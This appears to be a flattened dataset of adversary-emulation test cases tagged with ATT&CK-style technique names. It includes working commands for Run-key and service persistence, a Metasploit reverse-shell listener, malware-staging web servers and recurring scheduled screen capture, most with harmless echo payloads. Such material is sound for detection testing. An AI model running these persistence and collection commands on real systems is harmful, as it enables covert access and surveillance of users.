attacks.description: Basic command to create a file using bash, demonstrating command execution.
attacks.expected_behavior: Creates a file named test.txt in the /tmp directory with the content 'Hello World'.

attacks.technique_name: Command and Scripting Interpreter: Windows Command Shell
attacks.description: Intermediate command to list files and save the output to a file, simulating data collection.
attacks.expected_behavior: Lists all files in the current directory and saves the output to a file named filelist.txt in the /tmp directory.

attacks.technique_name: Command and Scripting Interpreter: Windows Command Shell
attacks.description: Advanced command to create a directory and then create a file inside it, demonstrating more complex command execution.
attacks.expected_behavior: Creates a new directory named testdir in the /tmp directory and then creates a file named result.txt inside testdir with the content 'Success'.

attacks.command: reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "UpdateCheck" /t REG_SZ /d "cmd.exe /c echo Running benign update check & exit" /f
attacks.description: Adds a persistent entry to the current user's Run registry key using reg.exe
attacks.expected_behavior: Adds a registry value that executes a harmless command on user login. The command runs once per login session.

attacks.command: powershell -Command "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SyncHost' -Value 'cmd.exe /c echo Syncing user settings... > %TEMP%\sync.log' -ErrorAction SilentlyContinue"
attacks.description: Uses PowerShell to set a Run key entry with a benign sync message
attacks.expected_behavior: Creates or updates a Run key value that logs a message to %TEMP%\sync.log on each login

attacks.command: powershell -Command "$script = '%TEMP%\startup_task.bat'; Set-Content -Path $script -Value 'echo Persistent task executed at %TIME% >> %TEMP%\persistence.log' -Force; Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'BackgroundTask' -Value $script -ErrorAction SilentlyContinue"
attacks.description: Creates a batch script in %TEMP% and registers it in the Run key for persistence
attacks.expected_behavior: Writes a harmless batch file and configures it to run at login via the Run registry key. Logs execution time to a file in %TEMP%.

attacks.description: Appends test command to user's bashrc for persistence
attacks.expected_behavior: Adds benign command to ~/.bashrc that creates /tmp/.testfile on new terminal sessions

attacks.description: Adds persistence to rc.local (requires root)
attacks.expected_behavior: Creates /tmp/.rc_test file at boot via rc.local after ensuring proper exit code format

attacks.description: Creates desktop autostart entry for persistence
attacks.expected_behavior: Creates autostart .desktop file that executes touch command on user login

attacks.description: Basic DLL hijack setup: creates a mock vulnerable application directory in %TEMP% and copies a legitimate system DLL there to simulate a hijackable file.
attacks.expected_behavior: A new folder %TEMP%\vulnerable_app is created and kernel32.dll is copied into it. No system changes beyond the temporary folder.

attacks.description: Intermediate step: creates a dummy malicious DLL from a Base64 string using certutil and places it in the hijackable directory.
attacks.expected_behavior: A Base64‑encoded string is written to malicious.b64, then decoded into malicious.dll inside %TEMP%\vulnerable_app. The file is a harmless placeholder DLL.

attacks.description: Advanced exploitation: attempts to load the malicious DLL with regsvr32, emulating the execution phase of a DLL hijack attack.
attacks.expected_behavior: regsvr32 loads the placeholder DLL without registering it. Since the DLL contains no real code, the command completes with a success message and no side effects.

attacks.description: Scan for open ports and services to identify potential vulnerabilities
attacks.expected_behavior: Lists open ports and services on the local machine

attacks.description: Search for Linux exploits in the Exploit-DB database
attacks.expected_behavior: Lists potential exploits for Linux vulnerabilities

attacks.command: msfconsole -q -x 'use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set lhost 127.0.0.1; exploit'
attacks.description: Use Metasploit to set up a reverse TCP handler for a Linux Meterpreter payload
attacks.expected_behavior: Sets up a listener for a reverse TCP connection from a Meterpreter payload

attacks.description: Hosts malware.txt via busybox HTTP server on port 8080
attacks.expected_behavior: Starts a web server in /tmp/malstage hosting malware.txt on port 8080

attacks.description: Serves malware.txt via socat on port 8080
attacks.expected_behavior: socat listens on port 8080 and serves malware.txt to connecting clients

attacks.command: openssl req -x509 -newkey rsa:4096 -nodes -out /tmp/cert.pem -keyout /tmp/cert.pem -days 365 -subj '/CN=example.com' >/dev/null 2>&1 && echo 'test' > /tmp/malware.txt && openssl s_server -accept 8443 -cert /tmp/cert.pem -key /tmp/cert.pem -WWW -quiet
attacks.description: Hosts malware.txt via encrypted openssl s_server on port 8443
attacks.expected_behavior: Creates self-signed cert and starts HTTPS server hosting malware.txt on port 8443

attacks.technique_name: Obfuscated Files or Information: Indicator Removal from Tools
attacks.command: bash -c "echo 'import os' > test.py; echo 'os.system("/bin/ls")' >> test.py; python test.py"
attacks.description: Basic example of dynamic function resolution using Python
attacks.expected_behavior: Lists files in the current directory using Python

attacks.technique_name: Obfuscated Files or Information: Indicator Removal from Tools
attacks.command: bash -c "echo 'import ctypes' > test.py; echo 'libc = ctypes.CDLL("libc.so.6")' >> test.py; echo 'libc.system("/bin/ls")' >> test.py; python test.py"
attacks.description: Intermediate example using ctypes for dynamic linking
attacks.expected_behavior: Lists files in the current directory using ctypes and dynamic linking

attacks.technique_name: Obfuscated Files or Information: Indicator Removal from Tools
attacks.command: bash -c "echo 'import subprocess' > test.py; echo 'subprocess.call(["/bin/ls"])' >> test.py; python test.py"
attacks.description: Advanced example using subprocess for command execution
attacks.expected_behavior: Lists files in the current directory using subprocess

attacks.command: sc.exe create TestService binPath= "cmd.exe /c echo test" start= auto
attacks.description: Create a new Windows service with benign command
attacks.expected_behavior: Creates a stopped service named TestService that executes 'echo test' when started. Service remains disabled until manual start.

attacks.command: reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v TestEntry /t REG_SZ /d "cmd.exe /c echo test" /f
attacks.description: Add user-level persistence via Run registry key
attacks.expected_behavior: Creates a registry entry that executes 'echo test' on user login. Visible in standard Run key locations.

attacks.description: Create SYSTEM-level scheduled task on user logon
attacks.expected_behavior: Creates a hidden scheduled task running as SYSTEM that executes 'echo test' on every user login. Requires elevation to create.

attacks.description: Start the httpd service using systemctl
attacks.expected_behavior: The httpd service will be started, and the system will begin listening for incoming HTTP requests.

attacks.description: Open the crontab editor to schedule a new task
attacks.expected_behavior: The crontab editor will be opened, allowing the user to schedule a new task.

attacks.description: Enable the sshd service to start automatically on boot
attacks.expected_behavior: The sshd service will be enabled to start automatically on boot, allowing remote SSH connections to the system.

attacks.description: Basic archiving of a directory using tar
attacks.expected_behavior: Creates a compressed archive named archive.tar.gz in the current directory containing the files from /home/user/Documents

attacks.description: Intermediate archiving with exclusion of certain file types
attacks.expected_behavior: Creates a compressed archive named archive.tar.gz, excluding all .txt files from /home/user/Documents

attacks.description: Advanced archiving using find to select files based on criteria
attacks.expected_behavior: Appends all .log files found under /home/user to the archive.tar file

attacks.command: powershell -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen; $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height; $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size); $bitmap.Save(\"$env:TEMP\screenshot.png\");"
attacks.description: Basic screen capture using PowerShell .NET classes
attacks.expected_behavior: Creates screenshot.png in %TEMP% with current desktop image

attacks.command: powershell -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen; 1..2 | ForEach-Object { $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height; $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size); $bitmap.Save(\"$env:TEMP\screenshot$($_).png\"); Start-Sleep -Seconds 3 }; Compress-Archive -Path \"$env:TEMP\screenshot*.png\" -DestinationPath \"$env:TEMP\captures.zip\" -Force"
attacks.description: Intermediate: Capture 2 screenshots with delay, compress with -Force
attacks.expected_behavior: Creates two timestamped screenshots and compresses them to captures.zip

attacks.command: schtasks /create /tn "TestScreenCapture" /tr "powershell -Command \"Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen; $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height; $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size); $bitmap.Save(\\\"$env:TEMP\\\scheduled_capture.png\\\");\"" /sc minute /mo 5
attacks.description: Advanced: Scheduled task for recurring screen capture (SYSTEM context)
attacks.expected_behavior: Creates scheduled task running every 5 minutes to capture screenshots

attacks.description: Capture the entire screen and save it to a file named screenshot.png
attacks.expected_behavior: The command will capture the entire screen and save it to a file named screenshot.png in the current working directory.

attacks.description: Capture a specific region of the screen and save it to a file named screenshot.png
attacks.expected_behavior: The command will prompt the user to select a region of the screen to capture, and then save it to a file named screenshot.png in the current working directory.

attacks.description: Capture the current window and save it to a file named screenshot.png
attacks.expected_behavior: The command will capture the current window and save it to a file named screenshot.png in the current working directory.
